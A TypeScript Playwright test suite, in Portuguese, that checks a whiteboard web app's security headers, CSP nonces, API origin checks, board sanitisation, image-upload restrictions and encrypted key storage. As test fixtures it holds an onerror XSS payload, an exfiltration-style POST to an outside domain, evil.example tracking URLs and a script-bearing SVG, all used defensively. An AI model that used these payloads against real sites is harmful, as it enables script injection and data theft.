import { expect, png, test } from './fixtures';

test.describe('Segurança', () => {
  test('cabeçalhos de segurança e CSP com nonce novo a cada requisição', async ({ page, request }) => {
    const r1 = await page.goto('/');
    const h = r1!.headers();
    const csp = h['content-security-policy'] || '';
    for (const x of ["'nonce-", "'strict-dynamic'", "connect-src 'self'", "frame-ancestors 'none'", "object-src 'none'"]) expect(csp).toContain(x);
    expect(h['x-frame-options']).toBe('DENY');
    expect(h['x-content-type-options']).toBe('nosniff');
    expect(h['permissions-policy']).toBeTruthy();
    const r2 = await request.get('/');
    const n1 = /'nonce-([^']+)'/.exec(csp)?.[1];
    const n2 = /'nonce-([^']+)'/.exec(r2.headers()['content-security-policy'] || '')?.[1];
    expect(n1).toBeTruthy();
    expect(n1).not.toBe(n2);
  });

  test('CSP bloqueia script injetado na página', async ({ app, page, permitirConsole }) => {
    permitirConsole.push(/Content Security Policy/, /Failed to load resource/);
    await page.evaluate(() => {
      const d = document.createElement('div');
      d.innerHTML = '<img src="data:," onerror="window.__xss = 1">';
      document.body.appendChild(d);
    });
    await page.waitForTimeout(300);
    expect(await page.evaluate(() => (window as any).__xss)).toBeUndefined();
  });

  test('página não consegue enviar dados para outro domínio', async ({ app, page, permitirConsole }) => {
    permitirConsole.push(/Content Security Policy/, /Failed to fetch/, /Refused to connect/);
    const diretiva = await page.evaluate(async () => {
      const violacao = new Promise<string>(res => document.addEventListener('securitypolicyviolation', e => res(e.effectiveDirective), { once: true }));
      fetch('https://example.com/coleta', { method: 'POST', body: 'x' }).catch(() => {});
      return Promise.race([violacao, new Promise<string>(r => setTimeout(() => r('nenhuma'), 3000))]);
    });
    expect(diretiva).toBe('connect-src');
  });

  test('rotas de IA recusam chamadas de fora do site', async ({ request, baseURL }) => {
    const semOrigem = await request.post('/api/models', { data: { provider: 'anthropic', apiKey: '12345678' } });
    expect(semOrigem.status()).toBe(403);
    const outroSite = await request.post('/api/chat', { data: { provider: 'anthropic' }, headers: { origin: 'https://evil.example' } });
    expect(outroSite.status()).toBe(403);
    const naoJson = await request.post('/api/chat', { data: 'x', headers: { origin: baseURL!, 'content-type': 'text/plain' } });
    expect(naoJson.status()).toBe(415);
    const proprio = await request.post('/api/models', { data: { provider: 'xpto', apiKey: '12345678' }, headers: { origin: baseURL! } });
    expect(proprio.status()).toBe(400);
  });

  test('quadro salvo adulterado é limpo ao abrir', async ({ app, page }) => {
    await app.semear('ingressos', {
      nodes: [
        { id: 'm1', type: 'image', position: { x: 0, y: 0 }, width: 200, height: 100, data: { src: 'https://evil.example/pixel.png', caption: 'rastreio' } },
        { id: 'm2', type: 'note', position: { x: 300, y: 0 }, width: 200, height: 120, style: { position: 'fixed', inset: '0', zIndex: 9999 }, className: 'falso', data: { text: 'nota legítima', color: 'amarelo' } },
        { id: 'm3', type: 'script', position: { x: 0, y: 300 }, data: {} },
        { id: 'm4', type: 'image', position: { x: 0, y: 500 }, data: { src: 'data:image/svg+xml;base64,PHN2Zy8+' } }
      ],
      edges: [{ id: 'z', source: 'm2', target: 'nao-existe' }]
    });
    await expect(page.locator('.n-note', { hasText: 'nota legítima' })).toBeVisible();
    await expect(page.locator('.react-flow__node-image')).toHaveCount(0);
    await expect(page.locator('.react-flow__node[data-id="m3"]')).toHaveCount(0);
    expect(await app.no('m2').getAttribute('style')).not.toMatch(/fixed|9999/);
    expect(await app.no('m2').getAttribute('class')).not.toContain('falso');
  });

  test('JSON colado de fora vira nota de texto, nunca elementos', async ({ app, page }) => {
    await page.evaluate(() => navigator.clipboard.writeText(JSON.stringify({
      bancada: 1, nodes: [{ id: 'x1', type: 'image', position: { x: 0, y: 0 }, data: { src: 'https://evil.example/p.png' } }], edges: []
    })));
    await app.cliqueNoQuadro(0.5, 0.92);
    await page.keyboard.press('Control+v');
    await expect(page.locator('.react-flow__node-note')).toHaveCount(2);
    await expect(page.locator('.react-flow__node-image')).toHaveCount(0);
  });

  test('SVG e outros formatos de imagem são recusados', async ({ app, page }) => {
    await page.setInputFiles('#image-input', { name: 'x.svg', mimeType: 'image/svg+xml', buffer: Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>') });
    await expect(page.locator('.toast')).toContainText('PNG, JPEG, WebP ou GIF');
    await expect(page.locator('.react-flow__node-image')).toHaveCount(0);
  });

  test('imagens são recodificadas antes de entrar no quadro', async ({ app, page }) => {
    const original = png(200, 100).toString('base64');
    await page.setInputFiles('#image-input', { name: 'foto.png', mimeType: 'image/png', buffer: png(200, 100) });
    const src = await page.locator('.n-image img').getAttribute('src');
    expect(src).toMatch(/^data:image\/png;base64,/);
    expect(src).not.toBe(`data:image/png;base64,${original}`);
  });

  test('nenhuma chave em texto puro no armazenamento do navegador', async ({ app, page }) => {
    test.setTimeout(60_000);
    const chave = 'sk-ant-nao-pode-vazar-987654321';
    await app.aba('IA');
    await page.fill('#ai-key', chave);
    await page.check('#ai-remember');
    await page.fill('#ai-pass', 'senha-forte-123');
    await page.getByRole('button', { name: 'Salvar protegida' }).click();
    await expect(page.getByRole('button', { name: 'Bloquear agora' })).toBeVisible({ timeout: 15_000 });
    await page.waitForTimeout(700);
    const dump = await page.evaluate(async () => {
      const ler = (nome: string) => new Promise<string>(resolve => {
        const r = indexedDB.open(nome);
        r.onerror = () => resolve('');
        r.onsuccess = () => {
          const db = r.result, nomes = Array.from(db.objectStoreNames);
          if (!nomes.length) { db.close(); resolve(''); return; }
          const tx = db.transaction(nomes, 'readonly'), out: string[] = [];
          let faltam = nomes.length;
          nomes.forEach(n => {
            const g = tx.objectStore(n).getAll();
            g.onsuccess = () => { out.push(JSON.stringify(g.result)); if (--faltam === 0) { db.close(); resolve(out.join('')); } };
          });
        };
      });
      let idb = '';
      for (const d of await indexedDB.databases()) if (d.name) idb += await ler(d.name);
      return { web: JSON.stringify({ ...localStorage }) + JSON.stringify({ ...sessionStorage }), idb };
    });
    expect(dump.web + dump.idb).not.toContain(chave);
    expect(dump.web + dump.idb).not.toContain('sk-ant');
    expect(dump.idb).toContain('"iv"');
  });
});
